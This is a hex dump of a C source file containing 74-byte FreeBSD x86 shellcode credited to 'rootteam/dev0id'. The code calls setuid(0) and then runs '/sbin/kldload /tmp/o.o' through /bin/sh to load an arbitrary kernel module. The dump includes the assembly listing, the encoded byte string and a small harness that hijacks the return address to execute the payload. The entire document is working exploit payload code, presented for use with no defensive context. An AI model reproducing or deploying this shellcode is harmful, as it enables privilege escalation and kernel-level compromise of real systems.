00000000  2f 2a 20 54 68 65 20 6b  6c 64 6c 6f 61 64 20 73  |/* The kldload s|
00000010  68 65 6c 6c 63 6f 64 65  0d 0a 20 20 20 73 65 74  |hellcode..   set|
00000020  75 69 64 28 30 29 0d 0a  20 20 20 6c 6f 61 64 73  |uid(0)..   loads|
00000030  20 2f 74 6d 70 2f 6f 2e  6f 20 6b 65 72 6e 65 6c  | /tmp/o.o kernel|
00000040  20 6d 6f 64 75 6c 65 0d  0a 0d 0a 20 20 20 53 69  | module....   Si|
00000050  7a 65 09 37 34 20 62 79  74 65 73 0d 0a 20 20 20  |ze.74 bytes..   |
00000060  4f 53 20 20 20 46 72 65  65 42 53 44 0d 0a 09 09  |OS   FreeBSD....|
00000070  2f 72 6f 6f 74 74 65 61  6d 2f 64 65 76 30 69 64  |/rootteam/dev0id|
00000080  20 09 28 77 77 77 2e 73  79 73 77 6f 72 6c 64 2e  | .(www.sysworld.|
00000090  6e 65 74 29 0d 0a 09 09  09 64 65 76 30 69 64 40  |net).....dev0id@|
000000a0  75 6e 63 6f 6d 70 69 6c  65 64 2e 63 6f 6d 0d 0a  |uncompiled.com..|
000000b0  0d 0a 42 49 54 53 09 33  32 0d 0a 6a 6d 70 09 73  |..BITS.32..jmp.s|
000000c0  68 6f 72 74 09 63 61 6c  6c 6d 65 0d 0a 6d 61 69  |hort.callme..mai|
000000d0  6e 3a 0d 0a 09 70 6f 70  09 65 73 69 0d 0a 09 78  |n:...pop.esi...x|
000000e0  6f 72 09 65 61 78 2c 65  61 78 0d 0a 09 6d 6f 76  |or.eax,eax...mov|
000000f0  09 61 6c 2c 30 78 31 37  0d 0a 09 70 75 73 68 09  |.al,0x17...push.|
00000100  65 61 78 0d 0a 09 69 6e  74 09 30 78 38 30 0d 0a  |eax...int.0x80..|
00000110  09 78 6f 72 09 65 61 78  2c 65 61 78 0d 0a 09 70  |.xor.eax,eax...p|
00000120  75 73 68 09 65 61 78 0d  0a 09 70 75 73 68 20 6c  |ush.eax...push l|
00000130  6f 6e 67 09 30 78 36 38  37 33 32 66 36 65 0d 0a  |ong.0x68732f6e..|
00000140  09 70 75 73 68 20 6c 6f  6e 67 09 30 78 36 39 36  |.push long.0x696|
00000150  32 32 66 32 66 0d 0a 09  6d 6f 76 09 65 62 78 2c  |22f2f...mov.ebx,|
00000160  65 73 70 0d 0a 09 70 75  73 68 09 65 61 78 0d 0a  |esp...push.eax..|
00000170  09 70 75 73 68 20 77 6f  72 64 09 30 78 36 33 32  |.push word.0x632|
00000180  64 0d 0a 09 6d 6f 76 09  65 64 69 2c 65 73 70 0d  |d...mov.edi,esp.|
00000190  0a 09 70 75 73 68 09 65  61 78 0d 0a 09 70 75 73  |..push.eax...pus|
000001a0  68 09 65 73 69 0d 0a 09  70 75 73 68 09 65 64 69  |h.esi...push.edi|
000001b0  0d 0a 09 70 75 73 68 09  65 62 78 0d 0a 09 6d 6f  |...push.ebx...mo|
000001c0  76 09 65 64 69 2c 65 73  70 0d 0a 09 70 75 73 68  |v.edi,esp...push|
000001d0  09 65 61 78 0d 0a 09 70  75 73 68 09 65 64 69 0d  |.eax...push.edi.|
000001e0  0a 09 70 75 73 68 09 65  62 78 0d 0a 09 70 75 73  |..push.ebx...pus|
000001f0  68 09 65 61 78 0d 0a 09  6d 6f 76 09 61 6c 2c 30  |h.eax...mov.al,0|
00000200  78 33 62 0d 0a 09 69 6e  74 09 30 78 38 30 0d 0a  |x3b...int.0x80..|
00000210  63 61 6c 6c 6d 65 3a 0d  0a 09 63 61 6c 6c 09 6d  |callme:...call.m|
00000220  61 69 6e 0d 0a 09 64 62  09 27 2f 73 62 69 6e 2f  |ain...db.'/sbin/|
00000230  6b 6c 64 6c 6f 61 64 20  2f 74 6d 70 2f 6f 2e 6f  |kldload /tmp/o.o|
00000240  27 0d 0a 2a 2f 0d 0a 0d  0a 63 68 61 72 20 73 68  |'..*/....char sh|
00000250  65 6c 6c 63 6f 64 65 5b  5d 20 3d 0d 0a 09 22 5c  |ellcode[] =..."\|
00000260  78 65 62 5c 78 32 63 5c  78 35 65 5c 78 33 31 5c  |xeb\x2c\x5e\x31\|
00000270  78 63 30 5c 78 62 30 5c  78 31 37 5c 78 35 30 5c  |xc0\xb0\x17\x50\|
00000280  78 63 64 5c 78 38 30 5c  78 33 31 5c 78 63 30 5c  |xcd\x80\x31\xc0\|
00000290  78 35 30 5c 78 36 38 5c  78 36 65 22 0d 0a 09 22  |x50\x68\x6e"..."|
000002a0  5c 78 32 66 5c 78 37 33  5c 78 36 38 5c 78 36 38  |\x2f\x73\x68\x68|
000002b0  5c 78 32 66 5c 78 32 66  5c 78 36 32 5c 78 36 39  |\x2f\x2f\x62\x69|
000002c0  5c 78 38 39 5c 78 65 33  5c 78 35 30 5c 78 36 36  |\x89\xe3\x50\x66|
000002d0  5c 78 36 38 5c 78 32 64  5c 78 36 33 22 0d 0a 09  |\x68\x2d\x63"...|
000002e0  22 5c 78 38 39 5c 78 65  37 5c 78 35 30 5c 78 35  |"\x89\xe7\x50\x5|
000002f0  36 5c 78 35 37 5c 78 35  33 5c 78 38 39 5c 78 65  |6\x57\x53\x89\xe|
00000300  37 5c 78 35 30 5c 78 35  37 5c 78 35 33 5c 78 35  |7\x50\x57\x53\x5|
00000310  30 5c 78 62 30 5c 78 33  62 5c 78 63 64 22 0d 0a  |0\xb0\x3b\xcd"..|
00000320  09 22 5c 78 38 30 5c 78  65 38 5c 78 63 66 5c 78  |."\x80\xe8\xcf\x|
00000330  66 66 5c 78 66 66 5c 78  66 66 5c 78 32 66 5c 78  |ff\xff\xff\x2f\x|
00000340  37 33 5c 78 36 32 5c 78  36 39 5c 78 36 65 5c 78  |73\x62\x69\x6e\x|
00000350  32 66 5c 78 36 62 5c 78  36 63 5c 78 36 34 22 0d  |2f\x6b\x6c\x64".|
00000360  0a 09 22 5c 78 36 63 5c  78 36 66 5c 78 36 31 5c  |.."\x6c\x6f\x61\|
00000370  78 36 34 5c 78 32 30 5c  78 32 66 5c 78 37 34 5c  |x64\x20\x2f\x74\|
00000380  78 36 64 5c 78 37 30 5c  78 32 66 5c 78 36 66 5c  |x6d\x70\x2f\x6f\|
00000390  78 32 65 5c 78 36 66 22  3b 0d 0a 0d 0a 69 6e 74  |x2e\x6f";....int|
000003a0  0d 0a 6d 61 69 6e 28 76  6f 69 64 29 0d 0a 7b 0d  |..main(void)..{.|
000003b0  0a 09 69 6e 74 20 2a 72  65 74 3b 0d 0a 09 72 65  |..int *ret;...re|
000003c0  74 20 3d 20 28 69 6e 74  2a 29 26 72 65 74 2b 32  |t = (int*)&ret+2|
000003d0  3b 0d 0a 09 28 2a 72 65  74 29 20 3d 20 73 68 65  |;...(*ret) = she|
000003e0  6c 6c 63 6f 64 65 3b 0d  0a 7d                    |llcode;..}|
000003ea
